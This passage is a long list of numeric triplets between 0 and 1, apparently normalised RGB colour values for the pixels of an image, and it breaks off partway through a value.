{0.298,0.18,0.165},{0.616,0.42,0.325},{0.808,0.576,0.447},{0.824,0.592,0.463},{0.827,0.6,0.467},{0.824,0.588,0.451},{0.824,0.588,0.447},{0.816,0.584,0.443},{0.808,0.576,0.431},{0.796,0.557,0.42},{0.78,0.533,0.392},{0.769,0.522,0.38},{0.753,0.506,0.365},{0.741,0.486,0.345},{0.737,0.482,0.349},{0.714,0.459,0.322},{0.698,0.435,0.302},{0.69,0.427,0.298},{0.675,0.412,0.278},{0.667,0.408,0.275},{0.663,0.4,0.271},{0.651,0.384,0.255},{0.647,0.384,0.255},{0.639,0.376,0.251},{0.631,0.365,0.235},{0.627,0.357,0.231},{0.604,0.341,0.22},{0.584,0.318,0.204},{0.533,0.275,0.165},{0.475,0.224,0.125},{0.404,0.157,0.075},{0.365,0.125,0.055},{0.341,0.106,0.043},{0.318,0.09,0.031},{0.31,0.082,0.024},{0.306,0.082,0.024},{0.302,0.078,0.02},{0.29,0.071,0.016},{0.282,0.067,0.016},{0.278,0.067,0.02},{0.298,0.09,0.047},{0.314,0.106,0.067},{0.376,0.204,0.18},{0.357,0.169,0.122},{0.388,0.161,0.09},{0.447,0.2,0.118},{0.467,0.22,0.133},{0.478,0.224,0.137},{0.482,0.227,0.137},{0.49,0.231,0.145},{0.502,0.243,0.145},{0.514,0.251,0.153},{0.518,0.259,0.165},
{0.514,0.255,0.161},{0.506,0.247,0.157},{0.498,0.239,0.157},{0.49,0.235,0.153},{0.478,0.224,0.141},{0.467,0.212,0.133},{0.459,0.212,0.133},{0.455,0.196,0.122},{0.443,0.192,0.122},{0.427,0.18,0.11},{0.404,0.169,0.098},{0.498,0.38,0.384},{0.498,0.38,0.384},{0.482,0.365,0.361},{0.471,0.353,0.353},{0.459,0.337,0.333},{0.455,0.337,0.337},{0.455,0.341,0.341},{0.447,0.329,0.333},{0.435,0.325,0.318},{0.424,0.314,0.318},{0.416,0.302,0.306},{0.388,0.271,0.271},{0.357,0.239,0.235},{0.314,0.2,0.2},{0.267,0.165,0.149},{0.231,0.133,0.122},{0.196,0.102,0.086},{0.161,0.078,0.059},{0.141,0.059,0.043},{0.125,0.043,0.024},{0.11,0.027,0.012},{0.098,0.016,0.008},{0.094,0.012,0.008},{0.09,0.008,0.008},{0.09,0.008,0.008},{0.09,0.008,0.008},{0.094,0.012,0.012},{0.09,0.012,0.008},{0.098,0.008,0.008},{0.098,0.008,0.008},{0.102,0.012,0.008},{0.11,0.016,0.008},{0.114,0.016,0.008},{0.122,0.02,0.008},{0.129,0.027,0.008},{0.141,0.039,0.024},{0.165,0.063,0.043},{0.231,0.114,0.082},{0.686,0.471,0.357},{0.808,0.576,0.451},{0.827,0.604,0.475},{0.831,0.604,0.471},
{0.827,0.6,0.459},{0.82,0.588,0.451},{0.816,0.58,0.439},{0.804,0.565,0.427},{0.796,0.549,0.412},{0.776,0.529,0.388},{0.769,0.522,0.384},{0.761,0.51,0.369},{0.745,0.494,0.357},{0.729,0.475,0.337},{0.722,0.467,0.333},{0.71,0.451,0.314},{0.694,0.431,0.294},{0.69,0.431,0.302},{0.682,0.424,0.286},{0.671,0.404,0.271},{0.659,0.392,0.263},{0.643,0.38,0.251},{0.635,0.376,0.243},{0.604,0.345,0.224},{0.573,0.31,0.2},{0.506,0.251,0.157},{0.404,0.165,0.086},{0.329,0.098,0.031},{0.302,0.078,0.02},{0.278,0.063,0.012},{0.302,0.078,0.027},{0.329,0.106,0.055},{0.353,0.118,0.067},{0.404,0.161,0.106},{0.431,0.184,0.125},{0.435,0.18,0.125},{0.439,0.2,0.157},{0.459,0.235,0.224},{0.478,0.251,0.243},{0.451,0.208,0.2},{0.537,0.396,0.38},{0.443,0.275,0.227},{0.392,0.165,0.086},{0.447,0.2,0.114},{0.475,0.22,0.137},{0.49,0.235,0.149},{0.494,0.239,0.145},{0.498,0.239,0.149},{0.506,0.243,0.141},{0.525,0.263,0.165},{0.537,0.278,0.18},{0.533,0.275,0.184},{0.522,0.263,0.176},{0.522,0.263,0.176},{0.506,0.247,0.161},{0.49,0.231,0.149},{0.482,0.227,0.145},
{0.467,0.212,0.133},{0.455,0.196,0.125},{0.447,0.192,0.122},{0.435,0.184,0.114},{0.42,0.176,0.106},{0.545,0.427,0.439},{0.545,0.427,0.439},{0.518,0.4,0.404},{0.49,0.373,0.369},{0.463,0.345,0.337},{0.451,0.333,0.325},{0.439,0.318,0.31},{0.424,0.306,0.298},{0.408,0.29,0.282},{0.388,0.271,0.263},{0.349,0.231,0.224},{0.322,0.212,0.204},{0.29,0.18,0.169},{0.247,0.149,0.133},{0.224,0.125,0.11},{0.2,0.098,0.082},{0.165,0.075,0.055},{0.141,0.059,0.035},{0.118,0.039,0.016},{0.098,0.016,0.008},{0.082,0.008,0.008},{0.067,0.004,0.004},{0.059,0.004,0.004},{0.055,0.004,0.004},{0.063,0.004,0.004},{0.063,0.004,0.004},{0.071,0.004,0.008},{0.075,0.004,0.008},{0.078,0.004,0.008},{0.078,0.008,0.008},{0.082,0.004,0.008},{0.082,0.004,0.008},{0.082,0.008,0.008},{0.086,0.004,0.012},{0.086,0.008,0.004},{0.09,0.008,0.008},{0.098,0.008,0.008},{0.118,0.016,0.008},{0.251,0.122,0.078},{0.741,0.51,0.388},{0.804,0.58,0.451},{0.812,0.588,0.459},{0.816,0.6,0.467},{0.816,0.592,0.455},{0.816,0.592,0.451},{0.804,0.565,0.427},{0.804,0.557,0.424},{0.788,0.545,0.408},
{0.784,0.537,0.4},{0.773,0.525,0.384},{0.753,0.502,0.361},{0.745,0.49,0.353},{0.733,0.482,0.349},{0.729,0.475,0.341},{0.718,0.459,0.322},{0.706,0.447,0.31},{0.69,0.427,0.298},{0.675,0.416,0.286},{0.651,0.384,0.259},{0.627,0.365,0.243},{0.584,0.329,0.212},{0.518,0.267,0.157},{0.427,0.184,0.102},{0.325,0.098,0.035},{0.278,0.063,0.016},{0.302,0.086,0.035},{0.353,0.125,0.071},{0.424,0.18,0.122},{0.49,0.235,0.173},{0.525,0.271,0.2},{0.553,0.29,0.22},{0.58,0.318,0.243},{0.565,0.302,0.227},{0.525,0.263,0.2},{0.494,0.231,0.173},{0.467,0.2,0.161},{0.435,0.173,0.137},{0.376,0.133,0.094},{0.278,0.078,0.039},{0.345,0.129,0.063},{0.416,0.176,0.098},{0.463,0.208,0.125},{0.471,0.216,0.129},{0.486,0.235,0.145},{0.506,0.247,0.149},{0.514,0.255,0.153},{0.522,0.255,0.161},{0.525,0.263,0.169},{0.537,0.278,0.18},{0.545,0.29,0.188},{0.545,0.286,0.18},{0.533,0.271,0.169},{0.522,0.259,0.161},{0.506,0.247,0.161},{0.494,0.239,0.153},{0.482,0.227,0.149},{0.467,0.216,0.137},{0.459,0.208,0.133},{0.447,0.192,0.125},{0.431,0.184,0.114},{0.533,0.42,0.431},
{0.533,0.42,0.431},{0.525,0.408,0.416},{0.502,0.384,0.392},{0.475,0.361,0.361},{0.459,0.341,0.337},{0.447,0.325,0.322},{0.416,0.298,0.29},{0.384,0.267,0.259},{0.361,0.239,0.231},{0.318,0.2,0.188},{0.278,0.165,0.153},{0.251,0.137,0.125},{0.224,0.114,0.102},{0.196,0.098,0.082},{0.18,0.078,0.063},{0.153,0.063,0.047},{0.133,0.051,0.024},{0.118,0.031,0.008},{0.098,0.012,0.008},{0.082,0.008,0.008},{0.063,0.004,0.004},{0.051,0.004,0.004},{0.047,0,0},{0.043,0.004,0},{0.043,0.004,0},{0.047,0.004,0},{0.043,0,0},{0.047,0.004,0.004},{0.055,0.004,0.004},{0.055,0.004,0.004},{0.059,0.004,0.004},{0.059,0.004,0.004},{0.063,0.004,0.008},{0.071,0.004,0.004},{0.067,0.004,0.004},{0.075,0.004,0.004},{0.071,0.004,0.008},{0.09,0.008,0.008},{0.31,0.173,0.129},{0.761,0.525,0.404},{0.765,0.537,0.416},{0.78,0.557,0.431},{0.788,0.561,0.427},{0.792,0.569,0.435},{0.796,0.565,0.431},{0.796,0.557,0.424},{0.792,0.553,0.416},{0.784,0.541,0.404},{0.776,0.525,0.388},{0.773,0.522,0.384},{0.757,0.506,0.365},{0.745,0.494,0.357},{0.737,0.486,0.353},
{0.722,0.467,0.337},{0.694,0.435,0.306},{0.663,0.404,0.275},{0.624,0.369,0.243},{0.58,0.333,0.212},{0.518,0.267,0.161},{0.427,0.184,0.102},{0.314,0.09,0.035},{0.282,0.063,0.02},{0.361,0.122,0.075},{0.435,0.173,0.122},{0.49,0.224,0.157},{0.525,0.263,0.192},{0.58,0.318,0.239},{0.635,0.384,0.306},{0.651,0.4,0.325},{0.639,0.388,0.318},{0.588,0.333,0.275},{0.525,0.271,0.22},{0.455,0.208,0.161},{0.373,0.137,0.102},{0.275,0.075,0.051},{0.212,0.035,0.024},{0.247,0.059,0.027},{0.345,0.125,0.059},{0.384,0.153,0.078},{0.416,0.173,0.094},{0.459,0.208,0.122},{0.475,0.22,0.133},{0.494,0.239,0.145},{0.514,0.259,0.153},{0.522,0.263,0.157},{0.529,0.275,0.169},{0.545,0.29,0.18},{0.553,0.298,0.188},{0.553,0.298,0.188},{0.549,0.294,0.184},{0.545,0.286,0.18},{0.537,0.278,0.173},{0.525,0.271,0.18},{0.514,0.259,0.176},{0.494,0.243,0.165},{0.486,0.235,0.149},{0.482,0.227,0.149},{0.463,0.212,0.133},{0.455,0.2,0.133},{0.51,0.392,0.396},{0.51,0.392,0.396},{0.498,0.384,0.392},{0.486,0.373,0.38},{0.471,0.353,0.349},{0.439,0.322,0.31},{0.427,0.31,0.302},
{0.404,0.286,0.278},{0.365,0.243,0.235},{0.322,0.2,0.188},{0.278,0.157,0.149},{0.255,0.137,0.129},{0.235,0.125,0.11},{0.212,0.102,0.09},{0.2,0.094,0.078},{0.176,0.075,0.059},{0.161,0.063,0.043},{0.149,0.051,0.024},{0.125,0.031,0.012},{0.11,0.016,0.008},{0.09,0.008,0.008},{0.075,0.004,0.008},{0.071,0.008,0.008},{0.059,0.004,0.004},{0.055,0.004,0.004},{0.051,0.004,0},{0.047,0.004,0},{0.043,0.004,0.004},{0.039,0,0.004},{0.039,0,0.004},{0.039,0.004,0.004},{0.039,0,0.004},{0.039,0.004,0.004},{0.039,0.004,0.004},{0.039,0.004,0.004},{0.043,0,0.004},{0.051,0.004,0.004},{0.051,0.004,0.004},{0.063,0.004,0.004},{0.055,0.004,0.004},{0.431,0.263,0.196},{0.69,0.451,0.337},{0.678,0.443,0.329},{0.698,0.467,0.349},{0.729,0.49,0.365},{0.745,0.514,0.384},{0.765,0.529,0.396},{0.773,0.537,0.404},{0.776,0.533,0.396},{0.78,0.545,0.408},{0.773,0.533,0.392},{0.757,0.51,0.365},{0.737,0.486,0.353},{0.71,0.459,0.329},{0.663,0.416,0.282},{0.612,0.361,0.239},{0.541,0.298,0.188},{0.471,0.231,0.137},{0.384,0.157,0.078},{0.302,0.086,0.031},
{0.275,0.063,0.024},{0.341,0.114,0.067},{0.482,0.231,0.165},{0.627,0.365,0.29},{0.686,0.412,0.325},{0.706,0.416,0.318},{0.71,0.427,0.329},{0.702,0.427,0.333},{0.678,0.416,0.341},{0.627,0.369,0.302},{0.533,0.286,0.227},{0.341,0.137,0.102},{0.212,0.047,0.031},{0.2,0.035,0.016},{0.224,0.047,0.02},{0.278,0.075,0.031},{0.325,0.11,0.047},{0.353,0.129,0.059},{0.376,0.145,0.078},{0.396,0.161,0.086},{0.416,0.173,0.098},{0.447,0.196,0.106},{0.467,0.22,0.133},{0.49,0.235,0.149},{0.506,0.247,0.149},{0.525,0.267,0.165},{0.541,0.286,0.176},{0.557,0.298,0.192},{0.565,0.31,0.2},{0.569,0.306,0.196},{0.561,0.302,0.192},{0.553,0.298,0.184},{0.545,0.286,0.184},{0.537,0.278,0.188},{0.533,0.282,0.184},{0.518,0.267,0.176},{0.506,0.251,0.169},{0.49,0.235,0.149},{0.475,0.22,0.141},{0.451,0.2,0.125},{0.498,0.38,0.388},{0.498,0.38,0.388},{0.482,0.365,0.373},{0.463,0.345,0.345},{0.459,0.341,0.333},{0.42,0.302,0.294},{0.396,0.278,0.271},{0.361,0.239,0.231},{0.325,0.208,0.2},{0.298,0.18,0.169},{0.267,0.153,0.137},{0.259,0.141,0.129},{0.243,0.129,0.114},
{0.216,0.106,0.086},{0.188,0.078,0.063},{0.176,0.071,0.051},{0.165,0.059,0.039},{0.149,0.047,0.027},{0.137,0.035,0.016},{0.129,0.024,0.008},{0.106,0.012,0.008},{0.094,0.008,0.008},{0.086,0.008,0.008},{0.082,0.004,0.008},{0.075,0.004,0.008},{0.067,0.004,0.008},{0.059,0.004,0.004},{0.055,0.004,0.004},{0.051,0.004,0.004},{0.047,0,0.004},{0.043,0.004,0.004},{0.039,0,0},{0.035,0.004,0.004},{0.039,0.004,0.004},{0.031,0.004,0.004},{0.039,0.004,0.004},{0.031,0.004,0.004},{0.039,0.004,0.004},{0.035,0.004,0.004},{0.035,0,0.004},{0.059,0.012,0.012},{0.482,0.29,0.208},{0.514,0.29,0.2},{0.478,0.263,0.173},{0.553,0.329,0.22},{0.647,0.408,0.29},{0.69,0.447,0.329},{0.718,0.478,0.353},{0.729,0.49,0.361},{0.737,0.494,0.365},{0.729,0.486,0.353},{0.71,0.463,0.333},{0.659,0.408,0.278},{0.592,0.345,0.227},{0.49,0.255,0.153},{0.373,0.145,0.075},{0.29,0.082,0.027},{0.255,0.055,0.016},{0.267,0.055,0.024},{0.4,0.157,0.102},{0.541,0.278,0.192},{0.608,0.345,0.259},{0.702,0.435,0.345},{0.784,0.533,0.447},{0.808,0.565,0.467},{0.796,0.553,0.455},
{0.729,0.471,0.388},{0.608,0.349,0.282},{0.431,0.22,0.176},{0.278,0.098,0.075},{0.208,0.035,0.02},{0.259,0.055,0.02},{0.31,0.09,0.035},{0.341,0.118,0.051},{0.357,0.133,0.063},{0.357,0.133,0.059},{0.365,0.137,0.063},{0.365,0.141,0.067},{0.376,0.145,0.075},{0.396,0.161,0.086},{0.404,0.165,0.09},{0.42,0.173,0.094},{0.443,0.192,0.106},{0.451,0.2,0.114},{0.471,0.216,0.133},{0.51,0.251,0.157},{0.533,0.275,0.173},{0.549,0.298,0.188},{0.561,0.306,0.196},{0.569,0.31,0.2},{0.569,0.306,0.196},{0.561,0.306,0.196},{0.561,0.302,0.196},{0.549,0.294,0.192},{0.537,0.286,0.184},{0.522,0.267,0.176},{0.51,0.251,0.173},{0.494,0.239,0.157},{0.475,0.224,0.145},{0.463,0.216,0.141},{0.478,0.361,0.369},{0.478,0.361,0.369},{0.463,0.345,0.353},{0.443,0.325,0.322},{0.431,0.31,0.302},{0.396,0.278,0.271},{0.353,0.235,0.227},{0.329,0.212,0.2},{0.31,0.192,0.184},{0.29,0.169,0.161},{0.255,0.141,0.125},{0.247,0.133,0.118},{0.231,0.118,0.098},{0.208,0.098,0.082},{0.188,0.078,0.063},{0.18,0.067,0.055},{0.165,0.055,0.039},{0.153,0.047,0.024},{0.141,0.039,0.016},
{0.133,0.031,0.012},{0.125,0.024,0.008},{0.118,0.012,0.008},{0.098,0.012,0.008},{0.094,0.008,0.012},{0.09,0.008,0.008},{0.086,0.004,0.008},{0.086,0.008,0.008},{0.078,0.004,0.008},{0.071,0.004,0.008},{0.067,0.004,0.004},{0.063,0.004,0.004},{0.055,0.004,0.004},{0.055,0.004,0.004},{0.043,0.004,0.004},{0.047,0,0},{0.043,0.004,0.004},{0.043,0.004,0.004},{0.047,0.004,0},{0.043,0.004,0.004},{0.043,0.004,0.004},{0.035,0,0.004},{0.082,0.035,0.024},{0.376,0.188,0.125},{0.255,0.078,0.031},{0.29,0.098,0.043},{0.412,0.196,0.114},{0.506,0.282,0.18},{0.565,0.329,0.224},{0.588,0.361,0.243},{0.596,0.361,0.243},{0.569,0.329,0.216},{0.506,0.275,0.169},{0.408,0.18,0.106},{0.302,0.09,0.039},{0.227,0.031,0.012},{0.208,0.02,0.008},{0.251,0.047,0.027},{0.376,0.149,0.098},{0.569,0.318,0.227},{0.694,0.443,0.329},{0.753,0.51,0.404},{0.8,0.565,0.475},{0.831,0.608,0.522},{0.82,0.588,0.506},{0.769,0.522,0.443},{0.651,0.384,0.322},{0.345,0.133,0.102},{0.157,0.016,0.012},{0.204,0.024,0.012},{0.271,0.059,0.02},{0.322,0.098,0.035},{0.349,0.125,0.051},
{0.361,0.137,0.063},{0.365,0.141,0.067},{0.365,0.141,0.067},{0.361,0.133,0.059},{0.357,0.133,0.059},{0.353,0.129,0.055},{0.353,0.129,0.059},{0.353,0.129,0.055},{0.365,0.133,0.059},{0.365,0.133,0.063},{0.373,0.141,0.067},{0.38,0.145,0.075},{0.396,0.157,0.086},{0.424,0.18,0.098},{0.451,0.208,0.118},{0.482,0.239,0.145},{0.506,0.259,0.161},{0.541,0.29,0.184},{0.565,0.31,0.2},{0.58,0.322,0.212},{0.569,0.31,0.204},{0.557,0.298,0.196},{0.537,0.282,0.184},{0.529,0.278,0.188},{0.518,0.263,0.18},{0.51,0.255,0.173},{0.502,0.247,0.165},{0.486,0.227,0.153},{0.482,0.369,0.376},{0.482,0.369,0.376},{0.475,0.361,0.365},{0.455,0.337,0.337},{0.427,0.31,0.302},{0.4,0.282,0.278},{0.361,0.243,0.235},{0.314,0.196,0.188},{0.29,0.169,0.157},{0.275,0.157,0.145},{0.255,0.141,0.129},{0.243,0.129,0.11},{0.22,0.106,0.09},{0.196,0.086,0.071},{0.184,0.071,0.055},{0.169,0.059,0.043},{0.157,0.047,0.024},{0.145,0.043,0.016},{0.137,0.039,0.016},{0.133,0.035,0.016},{0.133,0.027,0.012},{0.129,0.02,0.008},{0.118,0.016,0.008},{0.114,0.012,0.008},{0.11,0.008,0.008},
{0.098,0.008,0.008},{0.098,0.008,0.008},{0.09,0.012,0.008},{0.086,0.008,0.008},{0.086,0.004,0.008},{0.086,0.008,0.008},{0.086,0.008,0.008},{0.082,0.008,0.008},{0.082,0.008,0.008},{0.078,0.008,0.008},{0.082,0.012,0.008},{0.086,0.008,0.004},{0.075,0.004,0.008},{0.063,0.004,0.004},{0.055,0.004,0.004},{0.047,0.004,0.004},{0.059,0.012,0.008},{0.271,0.133,0.098},{0.208,0.051,0.027},{0.165,0.012,0.008},{0.2,0.027,0.008},{0.247,0.063,0.02},{0.282,0.086,0.035},{0.298,0.102,0.051},{0.286,0.086,0.043},{0.243,0.055,0.027},{0.208,0.024,0.008},{0.188,0.016,0.008},{0.208,0.027,0.02},{0.318,0.106,0.071},{0.424,0.18,0.125},{0.549,0.282,0.2},{0.663,0.408,0.306},{0.753,0.522,0.412},{0.812,0.604,0.498},{0.835,0.635,0.541},{0.835,0.631,0.549},{0.788,0.569,0.49},{0.698,0.455,0.384},{0.545,0.298,0.239},{0.239,0.075,0.059},{0.173,0.012,0.008},{0.259,0.051,0.016},{0.302,0.082,0.024},{0.329,0.11,0.039},{0.345,0.125,0.051},{0.353,0.133,0.055},{0.353,0.133,0.055},{0.357,0.133,0.063},{0.357,0.133,0.063},{0.353,0.133,0.059},{0.349,0.129,0.055},{0.349,0.129,0.055},
{0.341,0.122,0.051},{0.341,0.118,0.043},{0.329,0.106,0.039},{0.322,0.098,0.035},{0.325,0.102,0.039},{0.322,0.098,0.031},{0.314,0.09,0.031},{0.314,0.086,0.027},{0.325,0.094,0.027},{0.337,0.106,0.043},{0.365,0.122,0.055},{0.455,0.212,0.129},{0.561,0.31,0.2},{0.58,0.322,0.212},{0.569,0.314,0.204},{0.561,0.302,0.2},{0.549,0.29,0.188},{0.537,0.278,0.184},{0.529,0.271,0.188},{0.518,0.263,0.18},{0.51,0.251,0.173},{0.498,0.243,0.157},{0.486,0.373,0.38},{0.486,0.373,0.38},{0.459,0.345,0.349},{0.459,0.341,0.337},{0.427,0.31,0.302},{0.392,0.275,0.267},{0.345,0.231,0.22},{0.302,0.184,0.176},{0.275,0.153,0.145},{0.255,0.141,0.129},{0.243,0.129,0.11},{0.22,0.106,0.09},{0.196,0.086,0.071},{0.184,0.071,0.055},{0.176,0.063,0.047},{0.169,0.055,0.031},{0.157,0.047,0.027},{0.145,0.039,0.016},{0.141,0.039,0.02},{0.141,0.035,0.016},{0.141,0.043,0.016},{0.141,0.043,0.02},{0.149,0.047,0.024},{0.153,0.051,0.024},{0.169,0.051,0.031},{0.173,0.059,0.035},{0.188,0.067,0.035},{0.196,0.075,0.043},{0.2,0.078,0.039},{0.208,0.082,0.039},{0.216,0.086,0.043},
{0.2,0.075,0.031},{0.196,0.071,0.027},{0.188,0.071,0.031},{0.2,0.078,0.035},{0.192,0.071,0.024},{0.184,0.063,0.027},{0.169,0.051,0.02},{0.161,0.051,0.024},{0.18,0.063,0.031},{0.224,0.094,0.055},{0.392,0.216,0.169},{0.439,0.239,0.184},{0.345,0.165,0.118},{0.173,0.024,0.012},{0.153,0.008,0.004},{0.161,0.008,0.008},{0.169,0.008,0.008},{0.173,0.008,0.008},{0.169,0.008,0.008},{0.165,0.008,0.008},{0.22,0.047,0.035},{0.361,0.141,0.102},{0.494,0.235,0.161},{0.561,0.286,0.204},{0.624,0.349,0.259},{0.69,0.427,0.329},{0.733,0.502,0.412},{0.769,0.557,0.467},{0.776,0.576,0.494},{0.737,0.533,0.463},{0.667,0.443,0.376},{0.584,0.337,0.278},{0.373,0.173,0.129},{0.125,0.02,0.016},{0.176,0.012,0.008},{0.259,0.055,0.016},{0.306,0.086,0.027},{0.322,0.102,0.035},{0.337,0.114,0.043},{0.345,0.122,0.051},{0.349,0.133,0.059},{0.349,0.125,0.059},{0.349,0.129,0.063},{0.349,0.125,0.055},{0.345,0.125,0.051},{0.349,0.125,0.051},{0.341,0.114,0.047},{0.349,0.118,0.055},{0.361,0.125,0.067},{0.373,0.133,0.075},{0.388,0.145,0.094},{0.404,0.157,0.106},{0.416,0.165,0.122},
{0.435,0.173,0.137},{0.459,0.188,0.153},{0.459,0.196,0.157},{0.498,0.314,0.275},{0.42,0.208,0.161},{0.412,0.161,0.09},{0.545,0.294,0.192},{0.557,0.302,0.2},{0.549,0.29,0.192},{0.549,0.29,0.188},{0.545,0.29,0.192},{0.541,0.282,0.192},{0.537,0.282,0.192},{0.533,0.275,0.188},{0.518,0.255,0.173},{0.506,0.247,0.169},{0.467,0.357,0.361},{0.467,0.357,0.361},{0.463,0.349,0.353},{0.447,0.329,0.325},{0.4,0.286,0.278},{0.361,0.243,0.235},{0.318,0.2,0.188},{0.298,0.176,0.169},{0.255,0.145,0.129},{0.231,0.122,0.106},{0.224,0.11,0.09},{0.208,0.09,0.075},{0.184,0.075,0.059},{0.173,0.059,0.043},{0.165,0.051,0.035},{0.161,0.047,0.027},{0.157,0.051,0.024},{0.169,0.059,0.035},{0.188,0.071,0.047},{0.212,0.094,0.063},{0.239,0.114,0.082},{0.271,0.137,0.102},{0.29,0.153,0.11},{0.306,0.165,0.118},{0.318,0.176,0.129},{0.325,0.18,0.125},{0.322,0.173,0.118},{0.306,0.165,0.106},{0.29,0.149,0.094},{0.275,0.137,0.082},{0.271,0.129,0.078},{0.29,0.145,0.09},{0.322,0.169,0.106},{0.345,0.18,0.106},{0.357,0.18,0.098},{0.345,0.169,0.09},{0.337,0.161,0.09},
{0.337,0.165,0.09},{0.341,0.169,0.09},{0.365,0.188,0.122},{0.439,0.255,0.2},{0.447,0.255,0.196},{0.427,0.231,0.173},{0.341,0.161,0.122},{0.192,0.055,0.035},{0.133,0.008,0.004},{0.153,0.008,0.008},{0.157,0.008,0.004},{0.192,0.031,0.024},{0.29,0.102,0.075},{0.435,0.212,0.161},{0.608,0.357,0.282},{0.71,0.471,0.376},{0.757,0.514,0.42},{0.741,0.49,0.4},{0.71,0.447,0.361},{0.663,0.408,0.325},{0.635,0.408,0.329},{0.608,0.388,0.318},{0.565,0.333,0.271},{0.498,0.247,0.188},{0.424,0.165,0.11},{0.255,0.075,0.047},{0.086,0.004,0.004},{0.173,0.012,0.008},{0.239,0.047,0.012},{0.282,0.075,0.016},{0.322,0.098,0.035},{0.357,0.129,0.059},{0.384,0.153,0.082},{0.408,0.173,0.102},{0.431,0.188,0.122},{0.439,0.192,0.133},{0.443,0.2,0.137},{0.463,0.212,0.153},{0.482,0.227,0.169},{0.506,0.247,0.188},{0.518,0.259,0.196},{0.529,0.259,0.204},{0.541,0.259,0.2},{0.553,0.278,0.216},{0.557,0.278,0.216},{0.557,0.259,0.2},{0.557,0.298,0.271},{0.596,0.345,0.337},{0.608,0.373,0.361},{0.596,0.357,0.353},{0.675,0.525,0.51},{0.69,0.569,0.553},{0.404,0.149,0.082},
{0.506,0.251,0.169},{0.525,0.275,0.184},{0.537,0.278,0.184},{0.537,0.278,0.18},{0.545,0.286,0.188},{0.541,0.286,0.196},{0.537,0.278,0.184},{0.533,0.275,0.188},{0.525,0.271,0.184},{0.518,0.267,0.188},{0.463,0.349,0.349},{0.463,0.349,0.349},{0.435,0.322,0.318},{0.412,0.294,0.286},{0.376,0.263,0.251},{0.341,0.224,0.208},{0.31,0.192,0.176},{0.267,0.153,0.141},{0.239,0.125,0.11},{0.22,0.102,0.086},{0.196,0.082,0.067},{0.176,0.067,0.051},{0.169,0.063,0.043},{0.169,0.055,0.039},{0.176,0.063,0.043},{0.212,0.09,0.063},{0.271,0.137,0.106},{0.318,0.176,0.137},{0.349,0.2,0.149},{0.369,0.212,0.153},{0.376,0.212,0.153},{0.376,0.212,0.149},{0.369,0.212,0.145},{0.361,0.204,0.137},{0.349,0.192,0.122},{0.333,0.18,0.114},{0.329,0.176,0.114},{0.345,0.188,0.125},{0.365,0.196,0.129},{0.376,0.204,0.125},{0.38,0.192,0.11},{0.392,0.208,0.125},{0.388,0.2,0.118},{0.38,0.196,0.114},{0.373,0.188,0.106},{0.365,0.176,0.098},{0.353,0.165,0.086},{0.361,0.176,0.094},{0.388,0.196,0.125},{0.463,0.267,0.208},{0.475,0.263,0.2},{0.439,0.224,0.161},{0.373,0.161,0.098},
{0.294,0.102,0.047},{0.208,0.047,0.016},{0.141,0.027,0.02},{0.263,0.098,0.075},{0.404,0.192,0.137},{0.533,0.29,0.208},{0.624,0.373,0.275},{0.698,0.443,0.349},{0.808,0.584,0.498},{0.847,0.631,0.545},{0.812,0.592,0.51},{0.741,0.506,0.431},{0.651,0.4,0.329},{0.561,0.318,0.243},{0.498,0.267,0.196},{0.475,0.247,0.18},{0.459,0.224,0.165},{0.439,0.192,0.133},{0.404,0.157,0.102},{0.314,0.114,0.078},{0.22,0.059,0.043},{0.337,0.118,0.082},{0.424,0.184,0.125},{0.49,0.231,0.165},{0.541,0.275,0.208},{0.545,0.271,0.204},{0.533,0.255,0.192},{0.553,0.282,0.216},{0.569,0.31,0.239},{0.588,0.337,0.263},{0.624,0.373,0.286},{0.655,0.396,0.314},{0.671,0.412,0.325},{0.671,0.412,0.325},{0.671,0.408,0.325},{0.663,0.396,0.318},{0.682,0.408,0.333},{0.694,0.427,0.349},{0.682,0.416,0.329},{0.647,0.361,0.286},{0.624,0.388,0.365},{0.675,0.478,0.49},{0.624,0.416,0.42},{0.565,0.329,0.322},{0.608,0.443,0.42},{0.569,0.439,0.424},{0.392,0.149,0.082},{0.447,0.2,0.125},{0.475,0.22,0.141},{0.486,0.231,0.145},{0.506,0.247,0.165},{0.529,0.275,0.18},{0.545,0.286,0.188},
{0.549,0.29,0.188},{0.545,0.286,0.188},{0.533,0.275,0.18},{0.541,0.298,0.224},{0.439,0.318,0.314},{0.439,0.318,0.314},{0.412,0.294,0.29},{0.38,0.263,0.251},{0.341,0.224,0.216},{0.306,0.192,0.176},{0.29,0.173,0.161},{0.251,0.137,0.118},{0.227,0.114,0.094},{0.212,0.094,0.078},{0.196,0.082,0.067},{0.196,0.078,0.063},{0.227,0.106,0.078},{0.294,0.157,0.125},{0.357,0.208,0.161},{0.4,0.239,0.188},{0.412,0.251,0.188},{0.412,0.239,0.173},{0.404,0.235,0.161},{0.392,0.224,0.149},{0.384,0.212,0.145},{0.376,0.208,0.137},{0.373,0.2,0.129},{0.38,0.216,0.141},{0.416,0.239,0.161},{0.439,0.255,0.161},{0.443,0.251,0.157},{0.451,0.255,0.165},{0.431,0.239,0.153},{0.384,0.2,0.11},{0.376,0.188,0.106},{0.388,0.2,0.114},{0.404,0.212,0.129},{0.396,0.208,0.122},{0.373,0.184,0.102},{0.4,0.204,0.122},{0.459,0.243,0.169},{0.51,0.275,0.204},{0.51,0.255,0.184},{0.498,0.243,0.169},{0.486,0.235,0.161},{0.471,0.227,0.153},{0.459,0.224,0.153},{0.459,0.231,0.161},{0.455,0.231,0.165},{0.506,0.271,0.192},{0.573,0.333,0.243},{0.655,0.412,0.306},{0.725,0.482,0.373},
{0.757,0.51,0.4},{0.788,0.549,0.443},{0.816,0.596,0.502},{0.812,0.604,0.514},{0.761,0.541,0.459},{0.655,0.412,0.341},{0.545,0.294,0.224},{0.498,0.243,0.18},{0.475,0.235,0.169},{0.471,0.235,0.169},{0.475,0.235,0.165},{0.478,0.231,0.165},{0.482,0.235,0.165},{0.518,0.259,0.184},{0.565,0.29,0.212},{0.612,0.329,0.243},{0.655,0.373,0.286},{0.702,0.427,0.337},{0.749,0.475,0.392},{0.769,0.478,0.396},{0.745,0.451,0.376},{0.737,0.463,0.388},{0.729,0.455,0.376},{0.757,0.498,0.416},{0.796,0.561,0.482},{0.82,0.6,0.522},{0.827,0.604,0.529},{0.824,0.604,0.529},{0.804,0.58,0.502},{0.765,0.525,0.451},{0.737,0.494,0.42},{0.69,0.439,0.373},{0.62,0.373,0.306},{0.522,0.267,0.212},{0.404,0.157,0.118},{0.329,0.102,0.082},{0.298,0.086,0.067},{0.275,0.071,0.039},{0.251,0.051,0.02},{0.306,0.094,0.039},{0.369,0.137,0.067},{0.388,0.149,0.078},{0.404,0